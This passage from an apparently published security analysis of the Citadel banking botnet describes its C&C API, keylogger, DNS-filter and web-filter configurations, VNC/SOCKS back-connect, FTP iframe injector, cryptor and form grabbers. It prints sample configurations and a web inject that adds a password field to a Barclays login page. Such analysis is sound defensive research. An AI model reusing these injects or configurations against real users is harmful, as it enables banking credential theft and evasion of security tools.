/><col /></colgroup><thead><tr><th>Format: api.php / &lt;security-token&gt; / &lt;handle&gt; / &lt;action&gt; [. &lt;extension&gt;]? &lt;parameters&gt; </th><td class="auto-generated">&nbsp;</td></tr><tr><th align="center">Parameters (video-grabber API)</th><th align="center">Description</th></tr></thead><tbody><tr><td>api.php</td><td>API functions for grabbing videos</td></tr><tr><td>&lt;security-token&gt;</td><td>Authentication code required to log onto the server for accessing stolen videos</td></tr><tr><td>&lt;handle&gt;</td><td>The object name, i.e. video </td></tr><tr><td>&lt;action&gt;</td><td>Actions to be performed</td></tr><tr><td>&lt;extension&gt;</td><td>Specifying the output format: PHP, HTML, JSON, XML</td></tr><tr><td>&lt;parameters&gt;</td><td>Function codes used by the main controller, e.g. embed</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;Details of the video-grabber API.</b></p></div><pre class="programlisting"><span class="bold"><strong>Examples:</strong></span>
                   http://&lt;domain_name&gt;folder/api.php/ahro4uNg/video/list? botId=AXDFRGT
                   http://&lt;domain_name&gt; /folder/api.php/ahro4uNg/video/list? botId=NGHJUL789&amp;embed=1
define (&#39;API_TOKEN_KEY&#39;, &#39;api_token_key&#39;);
</pre><p>Citadel also contains a built-in function that hooks Win32 API calls to take screenshots from the infected systems. Citadel monitors the location of the mouse pointer and captures the screen accordingly. A simple prototype is presented in Listing 3, which is used in collaboration with Win32 APIs such as SetCursorPos and GetCursorPos for capturing screenshots. </p><pre class="programlisting">HDC src = GetWindowDC(handle_source_window);  

HDC dest = CreateCompatibleDC(src);
HBITMAP capture = CreateCompatibleBitmap(src, src_window_X, src_window_Y);

SelectObject(dest, capture);
BitBlt(dest,0,0,src_window_X, src_window_Y, src,0,0,SRCCOPY);
ReleaseDC(handle_source_window, src);
DeleteDC(dest);


<span class="bold"><strong>Listing 3: Screen-capturing prototype using Win32 API.</strong></span>
</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id2252883"></a>4.5.2 Multi-process keylogging</h4></div></div></div><p>Citadel implements keylogging to capture keystrokes entered by the user. It has the ability to implement multi process keylogging, where the keylogger reads keystrokes entered by the user in multiple applications, not just the browser. By default, the keylogger is active only for browsers. For additional applications, the keylogger settings must be set in the configuration file, as shown in <a href="#table.3">Table 3</a>.</p><div class="table"><a id="table.3"></a><table border="1" summary="Keylogger configuration."><colgroup><col /><col /></colgroup><thead><tr><th align="center">Keylogger parameters</th><th align="center">Description</th></tr></thead><tbody><tr><td>Entry &lsquo;&lt;module&gt;&rsquo;</td><td>Activating the module: Keylogger</td></tr><tr><td>Processes</td><td>List of target processes that will be keylogged</td></tr><tr><td>Time</td><td>Defining for how long the application should record the keys</td></tr></tbody></table><p class="title"><b>Table&nbsp;3.&nbsp;Keylogger configuration.</b></p></div><pre class="programlisting"><span class="bold"><strong>Example:</strong></span>

entry &quot;Keylogger&quot;   | ------------------- Keylogger module
    processes &quot;calc.exe; * notepad *&quot; | ------------- Target processes to be keylogged
    5 time             | -------------  Record keystrokes for 5 minutes
  End
</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id4321943"></a>4.5.3 Command execution module</h4></div></div></div><p>When Citadel first executes on an infected machine it extracts operating system information. This information provides a bot herder with details of the infected environment, which helps to customize operations. The results are stored in the main admin panel for later use. <a href="#table.4">Table 4</a> shows the list of parameters used to configure the CmdList module in the main configuration file. </p><div class="table"><a id="table.4"></a><table border="1" summary="Command module configuration."><colgroup><col /><col /></colgroup><thead><tr><th align="center">Command parameters</th><th align="center">Description</th></tr></thead><tbody><tr><td>Entry &lsquo;&lt;module&gt;&rsquo;</td><td>Activating the module: CmdList</td></tr><tr><td>Commands</td><td>List of the commands to be executed </td></tr></tbody></table><p class="title"><b>Table&nbsp;4.&nbsp;Command module configuration.</b></p></div><pre class="programlisting"><span class="bold"><strong>Example:</strong></span>
entry &quot;CmdList&quot;
    &quot;hostname&quot;  |---------------------- Get the hostname of the infected machine
    &quot;netstat&quot; |---------------------- Get the list of opened ports and existing network connections       
    &quot;systeminfo&quot; |---------------------- Get the complete system information
  End
</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id3299428"></a>4.5.4 SOCKS and VNC controller</h4></div></div></div><p>Citadel supports two different back-connect servers for initiating reverse connections to the bot when it is placed inside a NAT environment or the network is filtered for communication. Secure Sockets (SOCKS) is designed specifically to access filtered areas of the networks using a secure proxy. It is implemented by creating a local SOCKS proxy and then routing traffic through it to connect back to the C&amp;C. The bot starts a SOCKS proxy if it is configured with that setting during build time. Citadel uses SOCKS and Virtual Network Computing (VNC) mode together for C&amp;C communication. Citadel can turn off the User Account Control (UAC) mode and the host&rsquo;s firewall to open up ports for nefarious purposes such as communicating with the C&amp;C. For configuration of SOCKS, the URLs of the gate and admin panels are required. </p><p>The VNC controller is a feature-rich component that uses the VNC protocol to communicate with the bot. The C&amp;C operates in two modes: &lsquo;connect&rsquo; and &lsquo;auto-connect&rsquo;. As the name suggests, the &lsquo;auto-connect&rsquo; configuration triggers a back connection with the C&amp;C panel whenever it is activated, whereas &lsquo;connect&rsquo; only establishes a connection on demand. In addition, Citadel can deploy filters in the form of URL masks to capture only specific sets of websites while using VNC (see the filtering discussion below). <a href="#table.5">Table 5</a> shows the API patterns used by the Citadel botnet for SOCKS and VNC communication. </p><div class="table"><a id="table.5"></a><table border="1" summary="Configuration parameters of VNC admin and SOCKS."><colgroup><col /><col /></colgroup><thead><tr><th>Format: api.php / &lt;security-token&gt; / &lt;handle&gt; / &lt;action&gt; ? &lt;parameters&gt; </th><td class="auto-generated">&nbsp;</td></tr><tr><th align="center">Parameters</th><th align="center">Description</th></tr></thead><tbody><tr><td>api.php</td><td>API functions for VNC admin and SOCKS</td></tr><tr><td>&lt;security-token&gt;</td><td>Authentication code required to log onto the server for accessing stolen videos</td></tr><tr><td>&lt;handle&gt;</td><td>The object name, i.e. VNC or SOCKS</td></tr><tr><td>&lt;action&gt;</td><td>Actions to be performed</td></tr><tr><td>&lt;parameters&gt;</td><td>Bot identifiers and protocol</td></tr></tbody></table><p class="title"><b>Table&nbsp;5.&nbsp;Configuration parameters of VNC admin and SOCKS.</b></p></div><pre class="programlisting"><span class="bold"><strong>Examples:</strong></span>
     http://&lt;domain_name&gt;/folder/api.php/ahro4uNg/vnc/connect? BotIP=X.X.X.X&amp; protocol = VNC
     http://&lt;domain_name&gt;/folder/api.php/ahro4uNg/socks/connect? BotIP =X.X.X.X&amp; protocol =SOCKS

    define (&#39;API_TOKEN_KEY&#39;, &#39;api_token_key&#39;);
</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id4099583"></a>4.5.5 DNS and web filters</h4></div></div></div><p>Citadel provides both DNS and web filters. </p><div class="itemizedlist"><ul type="disc"><li><p>DNS filters: The bot has the ability to control DNS traffic flow from the infected system, such as DNS redirection, modification and blocking. This functionality allows the bot herder to restrict access to security vendor websites. Up until version 1.3.5.1, the DNS filters only worked for system-level software and not for browsers. However, we expect later versions of the bot to extend this filtering. DNS filters can prevent access to C&amp;C gates or log servers from the infected machines. The filters can be implemented in several ways [<span class="citation"><a href="#citation.21">21</a></span>] depending on the design of the bot. <a href="#table.6">Table 6</a> shows how DNS filters are configured. </p><div class="table"><a id="table.6"></a><table border="1" summary="Enabling DNS filters. "><colgroup><col /><col /></colgroup><thead><tr><th align="center">Command parameters</th><th align="center">Description</th></tr></thead><tbody><tr><td>Entry &lsquo;&lt;module&gt;&rsquo;</td><td>Activating the module: DnsFilters</td></tr><tr><td>Parameters</td><td>List of DNS entries to be restricted</td></tr></tbody></table><p class="title"><b>Table&nbsp;6.&nbsp;Enabling DNS filters. </b></p></div><pre class="programlisting"><span class="bold"><strong>Example:</strong></span>
entry &quot;DnsFilters&quot;
    &quot;Microsoft.com = 127.0.0.1&quot; |----------------------- Restricting DNS Resolution
    &quot;Wepawet.com = 127.0.0.1&quot;
     &quot;anubis.org = 127.0.0.1&quot;
  End
</pre></li><li><p>Web filters: These filters are typically deployed to target the data-stealing process to a specific set of websites. The filters direct the bot to perform operations such as screenshot stealing, etc. against a given set of websites which are provided as parameters in the configuration file. The web filters work in conjunction with other modules, such as the video grabber or screenshot stealer, to capture specific data. Citadel uses special characters such as &lsquo;@&rsquo; and &lsquo;#&rsquo; to enable certain filters, as shown in <a href="#table.7">Table 7</a>.</p><div class="table"><a id="table.7"></a><table border="1" summary="Enabling web filters."><colgroup><col /><col /></colgroup><thead><tr><th align="center">Command parameters</th><th align="center">Description</th></tr></thead><tbody><tr><td>Entry &lsquo;&lt;module&gt;&rsquo;</td><td>Activating the module: WebFilters</td></tr><tr><td>Parameters</td><td>List of filters</td></tr></tbody></table><p class="title"><b>Table&nbsp;7.&nbsp;Enabling web filters.</b></p></div><pre class="programlisting"><span class="bold"><strong>Example:</strong></span>
entry &quot;WebFilters&quot;
  &quot;@ * example / *&quot;  | ---------------------------- Activates screenshot stealer
  &quot;@ @ * example.com / *&quot; | -------------------------- Activates full screen stealing
  &quot;# * example.com / *&quot;  |----------- Activates video recording
End
</pre></li></ul></div></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id2474942"></a>4.5.6 Geolocation filtering</h4></div></div></div><p>Citadel implements aggressive filtering based on geographical locations. This means that it can restrict traffic from a specific country simply by configuring the geolocation options in the C&amp;C panel. This allows Citadel to target a specific country during an infection campaign. Further, it can stop access to the C&amp;C panel from particular locations, which can impede the ability of malware analysts to gain access to the remote server. Citadel also deploys gateway filtering, so if a connection is initiated from a restricted country, the gateway simply rejects it or replies with an error. It is also possible to filter IP ranges belonging to a restricted country. For example, if the C&amp;C is hosted in Poland and geo IP filtering is enabled, only Polish computers will be able to receive the bot for installation and only Polish computers will be able to communicate with the C&amp;C. We determined that Citadel uses the <span class="emphasis"><em>MaxMind GeoIP</em></span> library to implement country-based filtering. </p></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id3435289"></a>4.5.7 FTP iframe injector</h4></div></div></div><p>Citadel has a built-in module for injecting iframes into HTML pages using FTP accounts. The FTP credentials are stolen from infected machines when the user communicates with servers using FTP. The FTP iframer is an automated code injection plug-in that can be used to distribute infections. The plug-in has the following features:</p><div class="itemizedlist"><ul type="disc"><li><p>To prevent any conflicts in PHP/ASP/JSP/HTML pages, the code is injected at the end of the web page. </p></li><li><p>Three different modes are used for interacting with the web page. If the mode is set to &lsquo;off&rsquo;, the iframe remains dormant. If the mode is &lsquo;inject&rsquo;, the iframer injects malicious iframes, and if the mode is &lsquo;preview&rsquo;, then it only walks through the web pages without performing any modifications.</p></li><li><p>A depth level can be specified for traversing directories to find target web pages. The depth level de-pends on access masks specified for directories.</p></li><li><p>The plug-in uses a cron job that queries the database for potential new FTP accounts. </p></li></ul></div><p><a href="#table.8">Table 8</a> shows the API used to extract FTP accounts from the database to be used by the iframer. </p><div class="table"><a id="table.8"></a><table border="1" summary="FTP iframer API in use."><colgroup><col /><col /></colgroup><thead><tr><th>Format: api.php / &lt;security-token&gt; / &lt;handle&gt; / &lt;action&gt; [. &lt;extension&gt;]? &lt;parameters&gt; </th><td class="auto-generated">&nbsp;</td></tr><tr><th align="center">Parameters (FTP iframer API)</th><th align="center">Description</th></tr></thead><tbody><tr><td>api.php</td><td>API functions for grabbing videos</td></tr><tr><td>&lt;security-token&gt;</td><td>Authentication code required to log onto the server for accessing stolen FTP credentials</td></tr><tr><td>&lt;handle&gt;</td><td>The object name, i.e. iframer</td></tr><tr><td>&lt;action&gt;</td><td>Actions to be performed</td></tr><tr><td>&lt;parameters&gt;</td><td>Function codes used by the main controller, e.g. embed</td></tr></tbody></table><p class="title"><b>Table&nbsp;8.&nbsp;FTP iframer API in use.</b></p></div><pre class="programlisting"><span class="bold"><strong>Examples:</strong></span>
    http://&lt;domain_name&gt;/folder/api.php / &lt;token&gt; / iframer / ftpList
    http://&lt;domain_name&gt;/folder/api.php / &lt;token&gt; / iframer / ftpList? date_from = []&amp; state = all
    http://&lt;domain_name&gt;/folder /api.php / &lt;token&gt; / iframer / ftpList? date_from = [] &amp; state = all &amp; plaintext = 1
define (&#39;API_TOKEN_KEY&#39;, &#39;api_token_key&#39;);
</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id4011859"></a>4.5.8 Cryptor and Scan4You</h4></div></div></div><p>The C&amp;C provides a cryptor service that has the ability to apply obfuscation patterns to make the bot difficult to detect. Interestingly, this is a paid service implemented by Citadel&rsquo;s developers: if the bot is generated using the cryptor service, a notification is sent to a database to check whether the user has paid for the service. In addition to this, in order to provide more efficiency and security, the C&amp;C has an integrated <span class="emphasis"><em>Scan4You</em></span> service, which is used to scan all generated bots on the server for possible detection by any anti-virus engine. <span class="emphasis"><em>Scan4You</em></span> [<span class="citation"><a href="#citation.22">22</a></span>] is an anonymous online service that checks the resistance of an executable file to detection by anti-virus and other security software. Once the scan is completed, a notification is sent to <span class="emphasis"><em>Jabber</em></span> about the results of the scan. For this service, a <span class="emphasis"><em>Scan4You</em></span> profile ID is required, including the API token and <span class="emphasis"><em>Jabber</em></span> address for notifications. <span class="emphasis"><em>Scan4You</em></span> is ideal for these purposes because it does not share samples with anti-virus vendors or any other public repositories. <a href="#figure.4">Figure 4</a> shows how the cryptor service handles obfuscated executables. </p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Cryptor in action in Citadel C&amp;C." src="/uploads/images/figures/2014/09/Citadel-fig4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Cryptor in action in Citadel C&amp;C.</b></p></div></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id3549338"></a>4.5.9 Web injects</h4></div></div></div><p>Web injects is a man-in-the-browser (MitB) technique of injecting illegitimate content into the HTTP responses sent by the target web server. As a system is infected, Citadel can easily hook into different browser libraries to alter the communication flow or to write web payloads into the HTTP responses. Web injects are used for data exfiltration and performing automated transactions on the user&rsquo;s behalf. Citadel has taken this technique from Zeus. Listing 4 shows a simple example of a web inject in which an input box is injected into a <span class="emphasis"><em>Barclays Bank </em></span>web page before it is opened in the browser. Basically, Citadel has the ability to inject into any HTTP GET or POST request. It uses tags such as set_url, data_before, data_inject and data_after to map the web page so that illegitimate content (HTML/JS) can be injected at the right place. <span class="emphasis"><em>Malware at Stake</em></span> has presented the details regarding the usage of these parameters [<span class="citation"><a href="#citation.23">23</a></span>]. </p><pre class="programlisting">set_url https://ibank.internationalbanking.barclays.com/logon/icebapplication* GP
data_before
name=&quot;simple_surname_text&quot;*&lt;tr&gt;
data_end
data_inject
&lt;td class=&quot;bold&quot; width=&quot;22%&quot; nowrap=&quot;&quot;&gt;Memorable word:&lt;/td&gt;&lt;td colspan=&quot;2&quot; align=&quot;leftv width=&quot;35%&quot;&gt;&lt;font class=&quot;inputstyle&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;UKpass&quot; id=&quot;simple_surname_text&quot; size=&quot;24&quot; maxlength=&quot;24&quot; value=&quot;&quot; class=&quot;&quot; title=&rdquo;Memorable word&rdquo;/&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
data_end
data_after
data_end

<span class="bold"><strong>Listing 4: An example of web inject code.</strong></span>
</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id3232749"></a>4.5.10 Grabbers: HTTP and software</h4></div></div></div><p>Citadel implements grabbing functionality in which it hooks the libraries of software to capture credentials and other sensitive information. The grabbers are categorized into two classes:</p><div class="itemizedlist"><ul type="disc"><li><p>HTTP grabbers: these grabbers mainly target browsers, where the process is known as form grabbing. Using this technique, Citadel captures sensitive information such as username, password, SSN, credit card number, etc. The details are entered as values in the different fields of an HTML form. The bot hijacks all POST requests sent from the browser simply by hooking specific functions present in the browser libraries. HTTP grabbers play a significant role in exfiltrating data from infected computers. This technique can be combined with web injects to coerce users into supplying data that might otherwise not be available, e.g. asking for a PIN or SSN on a bank login page.</p></li><li><p>Software grabbers: these grabbers aim to steal credentials from software that uses protocols such as FTP, POP3 and SSH to communicate with the remote domains. For this, Citadel hooks functions such as WSASend that are present in the network libraries used by the operating system to communicate with a target domain. Software such as <span class="emphasis"><em>WinSCP</em></span>, <span class="emphasis"><em>WSFTP</em></span>, <span class="emphasis"><em>Total Commander</em></span>, <span class="emphasis"><em>Smart FTP</em></span>, <span class="emphasis"><em>FTP Commander</em></span>, <span class="emphasis"><em>Outlook</em></span>, <span class="emphasis"><em>Thunderbird</em></span>, <span class="emphasis"><em>FileZilla</em></span>, <span class="emphasis"><em>Macromedia Flash</em></span> and <span class="emphasis"><em>Core FTP</em></span> can be hooked by Citadel to grab information.</p></li></ul></div><p>In part two of this article we will present the results and analysis of our experiments. </p></div></div></div><div class="bibliography"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3332293"></a>Bibliography</h2></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Sood, A.; Enbody, R.J. Crimeware-as-a-service &ndash; a survey of commoditized crimeware in the under-ground market. 2013. Internal Journal of Critical Infrastructure Protection. <span class="bibliosource"><a href="https://dx.doi.org/10.1016/j.ijcip.2013.01.002" target="_blank">http://dx.doi.org/10.1016/j.ijcip.2013.01.002</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Provos, N.; Mavrommatis, P.; Rajab, M.A.; Monrose, F. All your iFRAMEs point to Us. 2008. Proceed-ings of the 17th USENIX Security Symposium (SS&rsquo;08).</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Sherstobitoff, R. Inside the World of Citadel Trojan. McAfee Labs White Paper. <span class="bibliosource"><a href="https://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf" target="_blank">http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Schwartz, M.J. NBC Websites Hacked To Serve Citadel Financial Malware. <span class="bibliosource"><a href="http://www.informationweek.com/security/attacks/nbc-websites-hacked-to-serve-citadel-fin/240149106" target="_blank">http://www.informationweek.com/security/attacks/nbc-websites-hacked-to-serve-citadel-fin/240149106</a></span>. </p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] SophosLabs. NBC website hacked and distributes malware &ndash; here&rsquo;s what happened. <span class="bibliosource"><a href="https://nakedsecurity.sophos.com/2013/02/22/nbc-website-hacked-and-distributes-malware/" target="_blank">http://nakedsecurity.sophos.com/2013/02/22/nbc-website-hacked-and-distributes-malware/</a></span>. </p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] Fox-It. Write-up on nbc.com distributing Citadel malware. <span class="bibliosource"><a href="http://blog.fox-it.com/2013/02/21/writeup-on-nbc-com-distributing-citadel-malware/" target="_blank">http://blog.fox-it.com/2013/02/21/writeup-on-nbc-com-distributing-citadel-malware/</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] Cert Polska Technical Report. <span class="bibliosource"><a href="https://www.cert.pl/PDF/Report_Citadel_plitfi_EN.pdf" target="_blank">http://www.cert.pl/PDF/Report_Citadel_plitfi_EN.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.8"></a><p class="bibliomixed">[8] Yan, G.; Chen, S.; Eidenbenz, S. RatBot: anti-enumeration peer-to-peer botnets. 2011. Proceedings of the 14th International Conference on Information Security (ISC&rsquo;11). </p></div><div class="bibliomixed"><a id="citation.9"></a><p class="bibliomixed">[9] Sood, A. Bot Wars &ndash; The Game of Win 32/64 Takeover. Hack-in-the-Box Magazine. <span class="bibliosource"><a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-009.pdf" target="_blank">http://magazine.hitb.org/issues/HITB-Ezine-Issue-009.pdf</a></span>. </p></div><div class="bibliomixed"><a id="citation.10"></a><p class="bibliomixed">[10] Stone-Gross, B.; Cova, M.; Cavallaro, L.; Gilbert, B.; Szydlowski, M.; Kemmerer, R.; Kruegel, C.; Vigna, G. Your botnet is my botnet: analysis of a botnet takeover. 2009. Proceedings of the 16th ACM confer-ence on Computer and Communications Security (CCS &lsquo;09).</p></div><div class="bibliomixed"><a id="citation.11"></a><p class="bibliomixed">[11] Sood, A.; Enbody, R.; Bansal, R. Dissecting SpyEye &ndash; Understanding the design of third generation botnets. 2012. Elsevier Computer Networks Journal. <span class="bibliosource"><a href="https://dx.doi.org/10.1016/j.comnet.2012.06.021" target="_blank">http://dx.doi.org/10.1016/j.comnet.2012.06.021</a></span>. </p></div><div class="bibliomixed"><a id="citation.12"></a><p class="bibliomixed">[12] Borgaonkar, R. An Analysis of the Asprox Botnet. 2010. Proceedings of Fourth International Conference on Emerging Security Information Systems and Technologies (SECURWARE).</p></div><div class="bibliomixed"><a id="citation.13"></a><p class="bibliomixed">[13] Stock, B.; G&ouml;bel, J.; Engelberth, M.; Freiling, F.C.; Holz, T. Walowdac &ndash; Analysis of a Peer-to-Peer Bot-net. Proceedings of the 2009 European Conference on Computer Network Defense (EC2ND). </p></div><div class="bibliomixed"><a id="citation.14"></a><p class="bibliomixed">[14] Binsalleeh, H.; Ormerod, T.; Boukhtouta, A.; Sinha, P.; Youssef, A.; Debbabi, M.; Wang, L. On the analysis of the Zeus botnet crimeware toolkit. 2010. Proceedings of the Eighth Annual International Conference on Privacy Security and Trust (PST). </p></div><div class="bibliomixed"><a id="citation.15"></a><p class="bibliomixed">[15] Lin, W.; Lee, D. Traceback Attacks in Cloud &ndash; Pebbletrace Botnet. 2012. Proceedings of the 32nd International Conference on Distributed Computing Systems Workshops (ICDCSW &rsquo;12).</p></div><div class="bibliomixed"><a id="citation.16"></a><p class="bibliomixed">[16] Sinha, P.; Boukhtouta, A.; Belarde, V.H.; Debbabi, M. Insights from the analysis of the Mariposa botnet. 2010. Proceedings of the Fifth International Conference on Risks and Security of Internet and Systems (CRiSIS). </p></div><div class="bibliomixed"><a id="citation.17"></a><p class="bibliomixed">[17] Celeda, P.; Krejci, R.; Vykopal, J.; Drasar, M. Embedded Malware &ndash; An Analysis of the Chuck Norris Botnet. 2010. Proceedings of the 2010 European Conference on Computer Network Defense.</p></div><div class="bibliomixed"><a id="citation.18"></a><p class="bibliomixed">[18] AhnLab Citadel Analysis Report. <span class="bibliosource"><a href="http://seifreed.es/docs/Citadel Trojan Report_eng.pdf" target="_blank">http://seifreed.es/docs/Citadel%20Trojan%20Report_eng.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.19"></a><p class="bibliomixed">[19] Wyke, J. The Citadel crimeware kit &ndash; under the microscope. <span class="bibliosource"><a href="https://nakedsecurity.sophos.com/2012/12/05/the-citadel-crimeware-kit-under-the-microscope/" target="_blank">http://nakedsecurity.sophos.com/2012/12/05/the-citadel-crimeware-kit-under-the-microscope/</a></span>.</p></div><div class="bibliomixed"><a id="citation.20"></a><p class="bibliomixed">[20] Zeus Tracker. <span class="bibliosource"><a href="https://zeustracker.abuse.ch/" target="_blank">https://zeustracker.abuse.ch/</a></span>.</p></div><div class="bibliomixed"><a id="citation.21"></a><p class="bibliomixed">[21] Sood, A.; Bansal, R.; Enbody, R. Botnets Die Hard. Proceedings of the 20th Annual DEFCON Conference.</p></div><div class="bibliomixed"><a id="citation.22"></a><p class="bibliomixed">[22] Scan4You Service. <span class="bibliosource"><a href="http://scan4you.net/" target="_blank">http://scan4you.net/</a></span>.</p></div><div class="bibliomixed"><a id="citation.23"></a><p class="bibliomixed">[23] SpyEye and Zeus Web Inject Parameters. <span class="bibliosource"><a href="https://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html" target="_blank">http://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html</a></span>. </p></div><div class="bibliomixed"><a id="citation.24"></a><p class="bibliomixed">[24] Caballero, J; Grier, C.; Kreibich, C.; Paxson, V. Measuring pay-per-install: the commoditization of malware distribution. 2011. Proceedings of the 20th USENIX conference on Security (SEC&rsquo;11).</p></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/magazine/2014/vb201409-Citadel.pdf" target="_blank"><img class="ccm-image-block responsive" alt="" src="/uploads/images/buttons/pdf-download-button.jpg" onmouseover="this.src = '/uploads/images/buttons/pdf-download-button-hover.jpg'" onmouseout="this.src = '/uploads/images/buttons/pdf-download-button.jpg'" border="0" height="45" width="262"></a></p>
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Prosecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one&url=https://www.virusbulletin.com/virusbulletin/2014/09/prosecting-citadel-botnet-revealing-dominance-zeus-descendent-part-one"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2014/09/prosecting-citadel-botnet-revealing-dominance-zeus-descendent-part-one'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2014/09/prosecting-citadel-botnet-revealing-dominance-zeus-descendent-part-one&title=Prosecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2014/09/prosecting-citadel-botnet-revealing-dominance-zeus-descendent-part-one&t=Prosecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2014/09/prosecting-citadel-botnet-revealing-dominance-zeus-descendent-part-one"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p></p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
